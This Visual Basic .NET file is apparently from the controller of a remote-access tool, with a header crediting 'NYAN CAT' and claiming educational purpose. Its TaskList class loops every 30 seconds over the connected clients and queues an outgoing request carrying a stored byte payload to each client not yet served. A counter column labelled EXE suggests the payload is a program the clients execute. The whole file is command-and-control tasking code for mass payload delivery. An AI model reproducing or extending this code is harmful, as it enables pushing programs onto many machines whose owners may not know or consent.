﻿
'       │ Author     : NYAN CAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.


Public Class TaskList
    Public List As List(Of String)
    Public B As Byte()
    Public Task As String
    Public F As Form1
    Public OK As Boolean = False
    Delegate Sub _Worker()
    Public Async Sub Worker()

        Dim List As New List(Of String)
        Dim OK As Boolean = True
        While True
            If F.InvokeRequired Then
                F.Invoke(New _Worker(AddressOf Worker))
                Exit Sub
            Else
                Debug.WriteLine("Task ")
                Try
                    For Each L As ListViewItem In F.LV3.Items
                        If L.Tag = Task Then
                            OK = True
                            For Each x As ListViewItem In F.LV1.Items
                                If Not List.Contains(x.SubItems(F._ID.Index).Text) Then
                                    List.Add(x.SubItems(F._ID.Index).Text)
                                    Dim i1 As Integer = x.SubItems(F._TASKS.Index).Text : i1 += 1
                                    x.SubItems(F._TASKS.Index).Text = i1
                                    Dim i2 As Integer = L.SubItems(F._EXE.Index).Text : i2 += 1
                                    L.SubItems(F._EXE.Index).Text = i2
                                    Dim ClientReq As New Outcoming_Requests(x.Tag, B)
                                    Pending.Req_Out.Add(ClientReq)
                                End If
                            Next
                            Exit For
                        End If
                    Next
                    If OK = False Then
                        Exit While
                    End If
                    OK = False
                Catch ex As Exception
                    Debug.WriteLine("Task " + ex.Message)
                End Try
                Await Threading.Tasks.Task.Delay(30 * 1000)
            End If
        End While
    End Sub

End Class